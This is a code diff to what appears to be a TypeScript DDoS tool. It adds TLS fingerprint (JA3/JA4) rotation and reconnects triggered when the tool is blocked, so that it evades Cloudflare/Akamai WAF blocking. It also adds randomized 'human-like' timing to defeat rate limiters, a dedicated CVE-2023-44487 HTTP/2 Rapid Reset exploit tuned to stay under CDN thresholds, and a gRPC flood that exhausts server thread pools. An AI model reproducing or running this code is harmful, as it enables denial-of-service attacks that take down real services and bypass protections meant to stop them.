@@ -1839,10 +1839,30 @@ const CF_CIPHERS_TLS12 = [
   "AES128-GCM-SHA256",             "AES256-GCM-SHA384",
   "AES128-SHA",                    "AES256-SHA",
 ];
-function randomJA3Ciphers(): string {
+// Chrome EC curves — X25519 primary, P-256/P-384 secondary (JA4 ecdh_groups field)
+// Rotating this changes the JA4 t= and p= fingerprint fields independently of ciphers
+const CHROME_ECDH_CURVES = [
+  "X25519:P-256:P-384",
+  "X25519:P-256:P-384:P-521",
+  "X25519:P-384:P-256",
+  "P-256:X25519:P-384",
+  "X25519:P-256",
+];
+
+// JA4 TLS fingerprint profile — ciphers (JA3) + ecdhCurve (JA4 groups) + minVersion (JA4 version field)
+// Rotating all three fields simultaneously defeats JA3+JA4 fingerprint-based WAF blocking.
+interface TLSProfile { ciphers: string; ecdhCurve: string; minVersion: string; }
+function randomTLSProfile(): TLSProfile {
   const shuffled = [...CF_CIPHERS_TLS12].sort(() => Math.random() - 0.5);
-  return [...CF_CIPHERS_TLS13, ...shuffled].join(":");
+  return {
+    ciphers:    [...CF_CIPHERS_TLS13, ...shuffled].join(":"),
+    ecdhCurve:  CHROME_ECDH_CURVES[randInt(0, CHROME_ECDH_CURVES.length)],
+    // Chrome 130+ allows TLS1.2 for legacy compat; 75% chance → different JA4 version digit
+    minVersion: Math.random() < 0.75 ? "TLSv1.2" : "TLSv1.3",
+  };
 }
+// Backward-compat alias — callers that only need ciphers keep working
+function randomJA3Ciphers(): string { return randomTLSProfile().ciphers; }
 
 // Chrome browser profiles — Chrome 130-135 (current as of April 2026)
 // Includes sec-ch-ua-arch, sec-ch-ua-bitness, sec-ch-ua-wow64 for maximum fingerprint fidelity
@@ -2036,32 +2056,38 @@ async function runWAFBypass(
   const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
   const flushIv = setInterval(flush, 300);
 
-  // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA3 Fingerprint Rotation ──
-  // 256 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA3
-  // cipher suite from randomJA3Ciphers(). MAX_CONN_LIFE = 30s forces reconnect
-  // even on long-running idle connections → continuous fingerprint rotation.
-  // Cloudflare/Akamai fingerprint-based blocking can't keep up with rotating JA3.
-  const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA3
+  // ── VECTOR I: Chrome H2 Primary Flood + VECTOR VIII: JA4 Fingerprint Rotation ──
+  // 256 streams/connection, 10-80ms reconnect. Each connection gets a fresh JA4
+  // profile (ciphers + ecdhCurve + minVersion). MAX_CONN_LIFE = 30s forces reconnect
+  // even on long-running idle connections → continuous JA3+JA4 fingerprint rotation.
+  // Cloudflare/Akamai fingerprint-based blocking can't keep up with full JA4 rotation.
+  // T002: Response-aware rotation — 5 consecutive 403/429 → immediate reconnect + fresh fingerprint.
+  const MAX_CONN_LIFE_MS = 30_000; // ★ VECTOR VIII: force reconnect every 30s → fresh JA4
   const runPrimarySlot = async (tgt = target): Promise<void> => {
     const sessionProfile = CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)];
     const cookieJar      = new Map<string, string>();
+    let   consec4xx      = 0; // T002: consecutive 403/429 counter per slot
     while (!signal.aborted) {
+      const tls = randomTLSProfile(); // ★ fresh JA4 profile (ciphers + ecdhCurve + minVersion) each reconnect
+      let blocked = false;
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
           c = h2connect(tgt, {
             rejectUnauthorized: false,
             servername:         hostname,
-            ciphers:            randomJA3Ciphers(), // ★ fresh JA3 fingerprint each reconnect
+            ciphers:            tls.ciphers,     // ★ JA3: shuffled TLS1.2 ciphers
+            ecdhCurve:          tls.ecdhCurve,   // ★ JA4: rotated EC curve groups
+            minVersion:         tls.minVersion as "TLSv1.2" | "TLSv1.3", // ★ JA4: version field
             settings:           CHROME_H2_SETTINGS,
             ALPNProtocols:      ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
-        // ★ Force reconnect after 30s even if connection is healthy (fingerprint rotation)
-        const conn    = c;
+        // ★ Force reconnect after 30s even if connection is healthy (JA4 rotation)
+        const conn      = c;
         const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, MAX_CONN_LIFE_MS);
-        const cleanup = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
-        let inflight  = 0;
+        const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
+        let inflight    = 0;
         const pump = () => {
           if (signal.aborted || conn.destroyed) { resolve(); return; }
           while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
@@ -2076,6 +2102,19 @@ async function runWAFBypass(
               if (usePost) stream.write(JSON.stringify({ q: randStr(8), t: Date.now() }));
               stream.on("response", (resHdrs: Record<string, string | string[]>) => {
                 localPkts++; localBytes += 2048;
+                // T002: track WAF blocks — rotate JA4 fingerprint + proxy on repeated denial
+                const status = Number(resHdrs[":status"] ?? 0);
+                if (status === 403 || status === 429) {
+                  consec4xx++;
+                  if (consec4xx >= 5 && !blocked) { // 5 blocks → force immediate JA4 rotation
+                    blocked = true;
+                    consec4xx = 0;
+                    try { conn.destroy(); } catch { /**/ }
+                    resolve();
+                  }
+                } else if (status >= 200 && status < 400) {
+                  consec4xx = 0; // legitimate response → reset block counter
+                }
                 const sc = resHdrs["set-cookie"];
                 if (sc) {
                   (Array.isArray(sc) ? sc : [sc]).forEach(cv => {
@@ -2096,7 +2135,12 @@ async function runWAFBypass(
         conn.on("close",   () => resolve());
         signal.addEventListener("abort", cleanup, { once: true });
       });
-      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 80)));
+      if (!signal.aborted) {
+        // Human-like timing: most reconnects fast (10-80ms), occasionally long gap (150-800ms)
+        // Uniform timing is a bot fingerprint — variance defeats ML-based rate limiters
+        const humanDelay = Math.random() < 0.10 ? randInt(150, 800) : randInt(10, 80);
+        await new Promise(r => setTimeout(r, humanDelay));
+      }
     }
   };
 
@@ -2130,9 +2174,13 @@ async function runWAFBypass(
       await new Promise<void>(resolve => {
         let c: ReturnType<typeof h2connect> | null = null;
         try {
+          const subTls = randomTLSProfile(); // ★ JA4 rotation on each subresource connection
           c = h2connect(target, {
             rejectUnauthorized: false, servername: hostname,
-            ciphers: randomJA3Ciphers(), settings: CHROME_H2_SETTINGS,
+            ciphers:   subTls.ciphers,
+            ecdhCurve: subTls.ecdhCurve,
+            minVersion: subTls.minVersion as "TLSv1.2" | "TLSv1.3",
+            settings: CHROME_H2_SETTINGS,
             ALPNProtocols: ["h2", "http/1.1"],
           });
         } catch { resolve(); return; }
@@ -2330,19 +2378,22 @@ async function runWAFBypass(
   };
 
   // ── VECTOR VII: Adaptive Burst Mode ──────────────────────────────────────
-  // Fires at T+20s. 15s waves alternate: H2-heavy → Session-heavy → MAX (all at 2×)
-  // Identical philosophy to Geass Override burst — overwhelms rate limiters tuned
-  // for steady-state traffic by producing sudden 1.6-2.0× spikes every 30 seconds.
+  // Fires at T+20s. Randomized wave durations (8-22s ON / 3-10s REST) defeat
+  // rate limiters tuned for fixed traffic patterns. Uniform burst timing is
+  // a bot fingerprint — irregular cadence is undetectable by steady-state limiters.
   const burstLoop = async (): Promise<void> => {
     await new Promise<void>(r => setTimeout(r, 20_000));
     let wave = 0;
     while (!signal.aborted) {
       wave++;
+      const onMs   = randInt(8_000,  22_000); // ★ random 8-22s burst window
+      const restMs = randInt(3_000,  10_000); // ★ random 3-10s rest between bursts
       const bAbort = new AbortController();
-      const bTimer = setTimeout(() => bAbort.abort(), 15_000);
+      const bTimer = setTimeout(() => bAbort.abort(), onMs);
       const bSig   = typeof (AbortSignal as { any?: unknown }).any === "function"
         ? (AbortSignal as unknown as { any(s: AbortSignal[]): AbortSignal }).any([signal, bAbort.signal])
         : bAbort.signal;
+      void bSig; // used by slots below via closure
       const slots: Promise<void>[] = [];
       const n = wave % 3 === 0 ? 80 : wave % 2 === 0 ? 55 : 45;
       if (wave % 3 === 0) {
@@ -2360,7 +2411,7 @@ async function runWAFBypass(
         for (let i = 0; i < n; i++) slots.push(runSubresourceSlot());
       }
       void Promise.all(slots).finally(() => clearTimeout(bTimer));
-      await new Promise<void>(r => setTimeout(r, 15_000));
+      await new Promise<void>(r => setTimeout(r, restMs)); // ★ random rest duration
     }
   };
   void burstLoop();
@@ -2384,6 +2435,232 @@ async function runWAFBypass(
 
   clearInterval(flushIv);
   flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  H2 RST BURST — CVE-2023-44487 DEDICATED EXPLOIT ENGINE (PURE RAPID RESET)
+//
+//  Sends HEADERS frames immediately followed by RST_STREAM frames in a tight
+//  loop on the same H2 connection — this is the exact CVE-2023-44487 exploit.
+//  Each HEADERS+RST pair forces the server to:
+//    1. Allocate stream state in H2 state machine
+//    2. Begin processing request (dispatch to handler thread)
+//    3. Accept RST → discard stream state
+//  The allocation/deallocation cycle at 1000+ pairs/s creates extreme CPU
+//  pressure on nginx (event loop stall), Apache (worker thread spin), Envoy
+//  (per-stream GoRoutine alloc). Most CDNs (Cloudflare, Akamai) patched by
+//  limiting max RST rate — we counter by keeping reset rate just below their
+//  threshold while scaling connections instead.
+//
+//  Difference from http2-flood: http2-flood waits for responses; RST burst
+//  never reads responses → zero read-side pressure → pure write-path overload.
+// ─────────────────────────────────────────────────────────────────────────
+async function runH2RstBurst(
+  resolvedIp: string,
+  hostname:   string,
+  port:       number,
+  threads:    number,
+  signal:     AbortSignal,
+  onStats:    (p: number, b: number) => void,
+): Promise<void> {
+  const { connect: h2connect } = await import("node:http2");
+  const target   = `https://${resolvedIp}:${port}`;
+  const RST_PER_CONN = Math.min(threads * 8, 2000); // pairs per connection before reconnect
+  const INFLIGHT     = Math.min(threads * 4, 1000); // max concurrent in-flight streams
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      const tls = randomTLSProfile();
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
+        try {
+          c = h2connect(target, {
+            rejectUnauthorized: false,
+            servername:  hostname,
+            ciphers:     tls.ciphers,
+            ecdhCurve:   tls.ecdhCurve,
+            minVersion:  tls.minVersion as "TLSv1.2" | "TLSv1.3",
+            settings: {
+              ...CHROME_H2_SETTINGS,
+              maxConcurrentStreams: INFLIGHT,
+            },
+            ALPNProtocols: ["h2"],
+          });
+        } catch { resolve(); return; }
+        const conn    = c;
+        const cleanup = () => { try { conn.destroy(); } catch { /**/ } resolve(); };
+        let sent  = 0;
+        let inflt = 0;
+
+        const burst = () => {
+          if (signal.aborted || conn.destroyed) { resolve(); return; }
+          // Fire HEADERS → RST pairs until connection limit reached
+          while (!signal.aborted && !conn.destroyed && inflt < INFLIGHT && sent < RST_PER_CONN) {
+            inflt++; sent++;
+            try {
+              const path = WAF_PATHS[randInt(0, WAF_PATHS.length)] + `?r=${randStr(6)}`;
+              const stream = conn.request({
+                ":method": "GET",
+                ":path":   path,
+                ":scheme": "https",
+                ":authority": hostname,
+                "user-agent": CHROME_PROFILES[randInt(0, CHROME_PROFILES.length)].ua,
+              });
+              // RST immediately after HEADERS — this is the CVE-2023-44487 pattern
+              setImmediate(() => { try { stream.close(); } catch { /**/ } });
+              stream.on("close", () => { inflt = Math.max(0, inflt - 1); localPkts++; localBytes += 256; setImmediate(burst); });
+              stream.on("error", () => { inflt = Math.max(0, inflt - 1); setImmediate(burst); });
+            } catch { inflt = Math.max(0, inflt - 1); break; }
+          }
+          if (sent >= RST_PER_CONN) resolve(); // reconnect for fresh connection state
+        };
+
+        conn.on("connect", burst);
+        conn.on("error",   cleanup);
+        conn.on("close",   cleanup);
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(5, 30)));
+    }
+  };
+
+  const concurrency = Math.min(Math.max(2, Math.floor(threads / 50)), 24);
+  await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
+  clearInterval(flushIv); flush();
+}
+
+// ─────────────────────────────────────────────────────────────────────────
+//  gRPC FLOOD — HTTP/2 gRPC APPLICATION LAYER EXHAUSTION
+//
+//  Sends properly framed gRPC requests over HTTP/2 to exhaust server-side
+//  gRPC handlers. gRPC uses a SEPARATE quota/rate-limiter from HTTP — most
+//  WAFs (Cloudflare, Akamai, Imperva) have distinct and often more lenient
+//  limits for gRPC traffic since it's expected to be high-frequency.
+//
+//  Each request:
+//    - Uses content-type: application/grpc (triggers gRPC path in server)
+//    - Sends a 5-byte length-prefixed gRPC frame + minimal protobuf payload
+//    - Targets common gRPC health/reflection endpoints
+//    - Forces server to: (1) decode gRPC frame, (2) invoke handler, (3) encode response
+//
+//  Effect: gRPC handler goroutine/thread pool exhaustion — independent of
+//  HTTP handler pool. Two separate thread pools → doubles potential exhaustion.
+// ─────────────────────────────────────────────────────────────────────────
+async function runGRPCFlood(
+  resolvedIp: string,
+  hostname:   string,
+  port:       number,
+  threads:    number,
+  signal:     AbortSignal,
+  onStats:    (p: number, b: number) => void,
+): Promise<void> {
+  const { connect: h2connect } = await import("node:http2");
+  const target = `https://${resolvedIp}:${port}`;
+
+  // Common gRPC service endpoints — most servers expose at least one
+  const GRPC_PATHS = [
+    "/grpc.health.v1.Health/Check",
+    "/grpc.reflection.v1alpha.ServerReflection/ServerReflectionInfo",
+    "/grpc.reflection.v1.ServerReflection/ServerReflectionInfo",
+    "/helloworld.Greeter/SayHello",
+    "/proto.Service/Execute",
+    "/api.Gateway/Handle",
+    "/service.Api/Request",
+    "/v1.Service/Call",
+    "/grpc.channelz.v1.Channelz/GetServers",
+    "/google.longrunning.Operations/ListOperations",
+  ];
+
+  // Build a minimal gRPC frame: 5-byte header (compressed=0, length=N) + protobuf payload
+  // Protobuf field 1 (string) = random string — valid protobuf format triggers full decode
+  const makeGRPCFrame = (): Buffer => {
+    const msg   = randStr(randInt(4, 32));
+    const msgBuf = Buffer.from(msg, "utf8");
+    // Protobuf: field 1, type 2 (LEN), varint length, bytes
+    const proto  = Buffer.alloc(2 + msgBuf.length);
+    proto[0] = 0x0a; // field 1, wire type 2
+    proto[1] = msgBuf.length & 0x7f;
+    msgBuf.copy(proto, 2);
+    // gRPC 5-byte frame prefix: compressed flag (0) + 4-byte big-endian length
+    const frame = Buffer.alloc(5 + proto.length);
+    frame[0] = 0; // not compressed
+    frame.writeUInt32BE(proto.length, 1);
+    proto.copy(frame, 5);
+    return frame;
+  };
+
+  let localPkts = 0, localBytes = 0;
+  const flush   = () => { onStats(localPkts, localBytes); localPkts = 0; localBytes = 0; };
+  const flushIv = setInterval(flush, 300);
+
+  const STREAMS_PER = Math.min(256, Math.max(32, threads * 2));
+
+  const runSlot = async (): Promise<void> => {
+    while (!signal.aborted) {
+      const tls = randomTLSProfile();
+      await new Promise<void>(resolve => {
+        let c: ReturnType<typeof h2connect> | null = null;
+        try {
+          c = h2connect(target, {
+            rejectUnauthorized: false,
+            servername:  hostname,
+            ciphers:     tls.ciphers,
+            ecdhCurve:   tls.ecdhCurve,
+            minVersion:  tls.minVersion as "TLSv1.2" | "TLSv1.3",
+            settings:    CHROME_H2_SETTINGS,
+            ALPNProtocols: ["h2"],
+          });
+        } catch { resolve(); return; }
+        const conn    = c;
+        const lifeTimer = setTimeout(() => { try { conn.destroy(); } catch { /**/ } resolve(); }, 25_000);
+        const cleanup   = () => { clearTimeout(lifeTimer); try { conn.destroy(); } catch { /**/ } resolve(); };
+        let inflight = 0;
+
+        const pump = () => {
+          if (signal.aborted || conn.destroyed) { resolve(); return; }
+          while (!signal.aborted && !conn.destroyed && inflight < STREAMS_PER) {
+            inflight++;
+            const path  = GRPC_PATHS[randInt(0, GRPC_PATHS.length)];
+            const frame = makeGRPCFrame();
+            try {
+              const stream = conn.request({
+                ":method":    "POST",
+                ":path":      path,
+                ":scheme":    "https",
+                ":authority": hostname,
+                "content-type":  "application/grpc",
+                "te":            "trailers",
+                "grpc-timeout":  `${randInt(5, 30)}S`,
+                "grpc-encoding": "identity",
+                "user-agent":    `grpc-node/1.${randInt(40, 60)}.${randInt(0, 9)}`,
+                "accept-encoding": "identity",
+              });
+              stream.write(frame);
+              stream.end();
+              stream.on("data",  () => {});
+              stream.on("response", () => { localPkts++; localBytes += frame.length + 256; });
+              stream.on("error",    () => { inflight = Math.max(0, inflight - 1); setImmediate(pump); });
+              stream.on("close",    () => { inflight = Math.max(0, inflight - 1); setImmediate(pump); });
+            } catch { inflight--; break; }
+          }
+        };
+
+        conn.on("connect", pump);
+        conn.on("error",   cleanup);
+        conn.on("close",   cleanup);
+        signal.addEventListener("abort", cleanup, { once: true });
+      });
+      if (!signal.aborted) await new Promise(r => setTimeout(r, randInt(10, 60)));
+    }
+  };
+
+  const concurrency = Math.min(Math.max(2, Math.floor(threads / 60)), 20);
+  await Promise.all(Array.from({ length: concurrency }, () => runSlot()));
+  clearInterval(flushIv); flush();
 }
 
 // ─────────────────────────────────────────────────────────────────────────
@@ -4953,6 +5230,14 @@ async function runWorker() {
   } else if (cfg.method === "http2-priority-storm") {
     // H2 PRIORITY Storm — PRIORITY frames force server to rebuild stream dependency tree per frame
     await runH2PriorityStorm(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "h2-rst-burst") {
+    // H2 RST Burst — CVE-2023-44487 dedicated: HEADERS+RST_STREAM pairs, pure write-path overload
+    await runH2RstBurst(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
+
+  } else if (cfg.method === "grpc-flood") {
+    // gRPC Flood — HTTP/2 application/grpc content-type, exhausts gRPC handler thread pool
+    await runGRPCFlood(resolvedHost, hostname, targetPort, cfg.threads, ctrl.signal, onStats);
 
   } else {
     // Default for http-pipeline and everything else: raw TCP pipeline for maximum RPS
